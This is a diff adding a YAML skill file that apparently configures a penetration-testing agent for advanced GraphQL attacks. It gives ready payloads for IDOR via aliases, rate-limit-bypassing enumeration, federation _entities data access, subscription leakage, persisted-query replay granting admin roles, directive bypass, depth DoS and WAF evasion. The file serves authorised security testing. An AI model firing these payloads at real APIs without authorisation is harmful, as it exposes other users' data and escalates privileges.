@@ -1,0 +1,122 @@
+schema_version: 1
+version: 3.0.0
+name: graphql-advanced-attacks
+description: >
+  Advanced GraphQL security testing covering resolver-level IDOR via aliases, batch/alias
+  enumeration bypass, federation entity materialization, subscription event leakage,
+  persisted query abuse, cursor manipulation, directive bypass, and complexity attacks.
+  Complements the existing graphql-pentest skill with deeper resolver and federation coverage.
+triggers:
+  - graphql advanced
+  - graphql federation
+  - graphql batch
+  - graphql subscription
+  - graphql resolver
+  - graphql entity
+  - graphql cursor
+  - graphql persisted query
+  - graphql complexity
+  - graphql idor
+  - _entities
+  - _service sdl
+  - relay node
+tools:
+  - curl
+  - httpx
+  - python3
+knowledge: |
+  GraphQL security requires testing at the resolver level, not just the endpoint.
+  A gateway may enforce auth correctly while subgraph resolvers assume gateway has already checked.
+  Test every principal/resource combination with the same operation via aliases in one request.
+
+  1. RESOLVER-LEVEL IDOR VIA ALIASES (Single Request, Dual Principal):
+     Aliases compare owned vs foreign objects in a single request — bypasses per-request rate limits:
+       query {
+         own: order(id:"OWNED_ID") { id total owner { email } }
+         foreign: order(id:"FOREIGN_ID") { id total owner { email } }
+       }
+     Child resolver gap (parent checks auth, child skips it):
+       query {
+         user(id:"FOREIGN_USER") {
+           id
+           privateData { secrets }
+         }
+       }
+     Relay node resolution (decode base64 global ID, swap type/id):
+       query { node(id:"VXNlcjoxMjM=") { ... on User { email roles } } }
+
+  2. BATCH/ALIAS ENUMERATION — RATE LIMIT BYPASS:
+     Enumerate users/resources via aliases without triggering per-request rate limits:
+       query {
+         u1:user(id:"1"){email}
+         u2:user(id:"2"){email}
+         u3:user(id:"3"){email}
+       }
+     Identify per-field vs per-request auth inconsistencies via partial failure responses.
+     Array batching (non-standard): submit multiple full operations in one POST array.
+
+  3. FEDERATION EXPLOITATION:
+     SDL exposure (subgraph internal schema leak):
+       POST /graphql -d '{"query":"{ _service { sdl } }"}'
+     Entity materialization (cross-subgraph IDOR):
+       POST /graphql -d '{
+         "query": "{ _entities(representations: [{__typename:\"User\", id:\"TARGET_ID\"}])
+                    { ... on User { email roles adminNotes } } }"
+       }'
+     Gateway enforces auth but subgraph resolvers may not — test _entities directly against
+     subgraph ports (often exposed internally on :4001, :4002).
+
+  4. SUBSCRIPTION SECURITY:
+     Auth at handshake vs per-message inconsistency:
+       a. Connect WebSocket as User-A, subscribe to User-B's channel via filter arg
+       b. Modify subscription variable after auth to foreign ID:
+          subscription { orderUpdates(userId:"FOREIGN_USER_ID") { status total } }
+       c. Disconnect, reconnect without re-auth (some implementations reuse WS session)
+
+  5. PERSISTED QUERY ABUSE:
+     APQ hashes leak from client bundles or Chrome devtools → replay privileged operations:
+       POST /graphql -d '{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"LEAKED_HASH"}}}'
+     Replay admin mutation with attacker variables (hash matches operation, not variables):
+       POST /graphql -d '{"variables":{"role":"admin","userId":"ATTACKER_ID"},
+                          "extensions":{"persistedQuery":{"version":1,"sha256Hash":"ADMIN_OP_HASH"}}}'
+
+  6. CURSOR & INPUT MANIPULATION:
+     Decode cursors (usually base64 → JSON or numeric offset):
+       echo "CURSOR_BASE64" | base64 -d | python3 -c "import sys,json; print(json.dumps(json.loads(sys.stdin.read()), indent=2))"
+     Manipulate offset/ID to cross ownership boundaries or skip authorization filters.
+     Input type confusion:
+       {id: 123} vs {id: "123"} vs {id: [123]} vs {id: null}  →  parser inconsistencies
+     Duplicate JSON keys: {"id": 1, "id": 2}  →  precedence varies, may bypass validation
+
+  7. DIRECTIVE ABUSE:
+     @defer/@stream incremental delivery may return gated data:
+       query {
+         me { id }
+         ... @defer { adminPanel { secrets } }
+       }
+     Custom @auth/@private directives annotate intent but MAY NOT enforce — verify per-resolver.
+
+  8. COMPLEXITY / DOS VALIDATION (limited, no destructive impact):
+     Fragment depth test to verify depth/complexity limits exist:
+       fragment x on User { friends { ...x } }  query { me { ...x } }
+     Expected: 400 with complexity/depth error; if 200 → no limit enforced.
+
+  9. WAF EVASION:
+     Transport switching: JSON → multipart/form-data → application/graphql → GET with query param
+     Fragment splitting: split sensitive fields across multiple fragments to bypass signature matching
+     Unicode aliases: use non-ASCII alias names where server allows them
+     HTTP/2 multiplexing: widen timing window for resolver-level race conditions
+
+  VALIDATION REQUIREMENTS:
+     a. Paired requests showing owner vs non-owner access via aliases in same response
+     b. Federation bypass: _entities accessing data subgraph doesn't auth-gate
+     c. Subscription event leakage: User-A receiving User-B's update events
+     d. Document exact resolver path (type → field → resolver function) where enforcement failed
+references:
+  - https://portswigger.net/web-security/graphql
+  - https://graphql.org/learn/security/
+  - https://owasp.org/www-project-web-security-testing-guide/
+  - https://attack.mitre.org/techniques/T1190/
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/graphql-advanced-attacks.yaml
